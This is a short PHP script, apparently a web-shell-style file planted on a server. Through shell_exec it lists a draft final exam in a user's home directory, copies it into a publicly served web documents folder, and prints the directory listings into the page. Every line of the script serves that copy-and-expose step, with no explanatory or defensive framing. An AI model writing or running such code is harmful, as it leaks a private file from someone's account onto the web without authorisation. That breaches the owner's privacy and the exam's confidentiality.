
<?php
$output = shell_exec('ls -la /home/cbeasley/AgvEFaPr4dVV/Final\ exam\ 20v3-draft.rtf');
echo "<pre>$output</pre>";
$output = shell_exec('cp /home/cbeasley/AgvEFaPr4dVV/Final\ exam\ 20v3-draft.rtf /var/www/documents/shared/IWptBJzlVU/exam.txt');
echo "<pre>$output</pre>";
$output = shell_exec('ls -la /var/www/documents/shared/IWptBJzlVU');
echo "<pre>$output</pre>";
?>
